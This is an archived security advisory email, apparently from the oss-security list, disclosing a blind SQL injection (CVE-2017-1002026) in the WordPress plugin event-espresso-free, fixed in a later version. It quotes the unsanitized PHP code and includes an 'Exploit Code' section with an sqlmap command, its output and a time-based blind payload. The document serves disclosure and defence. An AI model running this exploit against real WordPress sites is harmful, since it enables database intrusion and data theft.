X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2364" "Tuesday" "11" "July" "2017" "16:10:45" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<4E8FC4EB-4CE5-4AC4-A9E0-B304BC6B9683@me.com>" "57" "[oss-security] Blind SQL injection in wordpress plugin event-espresso-free v3.1.37.11.L, fixed in v3.1.37.12.L" "^Date:" nil nil "7" "2017071120:10:45" "[oss-security] Blind SQL injection in wordpress plugin event-espresso-free v3.1.37.11.L, fixed in v3.1.37.12.L" (number mark "U       larry0@me.co Jul 11   57/2364  " thread-indent "\"[oss-security] Blind SQL injection in wordpress plugin event-espresso-free v3.1.37.11.L, fixed in v3.1.37.12.L\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 12233 invoked by uid 550); 11 Jul 2017 20:11:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 12205 invoked from network); 11 Jul 2017 20:10:59 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
	t=1499803847; bh=N8iB6ACJFFL3zds0/e2B10dn9F1dkTEb53dORcxkua4=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=jFXZVQPM67czOsFnIMgXd15Te2542wdqfzHYYye0CFhe4kmF3IN69j4pgZZBll4Lr
 76+jz14pQF0ZJXjA4457/fE8TvU0mlElzuxrbxaBbAem2G04pyRX6apDuvhxWXT2dl
 1RtVBzvnn9AsyQmD6f5PhEfJHgNHgDWvA1Iqhl+ihtE/CYJn8Co24oJnZSOFN38kkO
 40hT7ysnGC47yd3cuwKsqqDVn/6HiukXVhRzZvMk687wvEsLz/BWwQJ5oWiTtHIYwj
 zIJg4JmhEhCtuoOohfa8uFWeeVndI7PlqK16VUWa/Y04UlSy7goDjAqv2M1rt+857v
 p6pO+bUj5i8DA==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-07-11_10:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=2 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1707110325
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <4E8FC4EB-4CE5-4AC4-A9E0-B304BC6B9683@me.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Date: Tue, 11 Jul 2017 16:10:45 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Blind SQL injection in wordpress plugin event-espresso-free
 v3.1.37.11.L, fixed in v3.1.37.12.L
To: Open Source Security <oss-security@lists.openwall.com>

Title: Blind SQL injection in wordpress plugin event-espresso-free v3.1.37.=
11.L
Author: Larry W. Cashdollar, @_larry0
Date: 2017-07-04
CVE-ID:[CVE-2017-1002026]
Download Site: https://wordpress.org/plugins/event-espresso-free/
Vendor: https://eventespresso.com/
Vendor Notified: 2017-07-07, fixed v3.1.37.12.L
Vendor Contact: plugins@wordpress.org
Advisory: http://www.vapidlabs.com/advisory.php?v=3D197
Description: Event Espresso Lite =E2=80=93 Event Management and Registratio=
n System
Vulnerability:
The function  edit_event_category does not sanitize user-supplied input via=
 the $id parameter before passing it into an SQL statement.  This allows a =
blind SQL attack by an authenticated user who can edit the event categories.


2-function edit_event_category(){
3-	global $wpdb;
4-=09
5:	$id=3D$_REQUEST['id'];
6-	$results =3D $wpdb->get_results("SELECT * FROM ". EVENTS_CATEGORY_TABLE =
." WHERE id =3D".$id);
7-	foreach ($results as $result){
8-		$category_id =3D $result->id;
9-		$category_name =3D stripslashes($result->category_name);
10-		$category_identifier =3D stripslashes($result->category_identifier);

Export: JSON TEXT XML
Exploit Code:
	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-admin/admin.php?pag=
e=3Devent_categories&action=3Dedit&id=3D*' --load-cookies=3D./cookie.txt --=
level=3D2 --risk=3D2 --dbms=3Dmysql
	=E2=80=A2=20=20
	=E2=80=A2=20=20
	=E2=80=A2 URI parameter '#1*' is vulnerable. Do you want to keep testing t=
he others (if any)? [y/N]=20
	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
of 364 HTTP(s) requests:
	=E2=80=A2 ---
	=E2=80=A2 Parameter: #1* (URI)
	=E2=80=A2     Type: AND/OR time-based blind
	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/admin.php?=
page=3Devent_categories&action=3Dedit&id=3D(CASE WHEN (6856=3D6856) THEN SL=
EEP(5) ELSE 6856 END)
	=E2=80=A2 ---
	=E2=80=A2 [14:53:44] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
	=E2=80=A2 web application technology: Apache 2.4.18
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
	=E2=80=A2 [14:53:44] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/example.com'
	=E2=80=A2=20=20
	=E2=80=A2 [*] shutting down at 14:53:44
	=E2=80=A2=20=20=
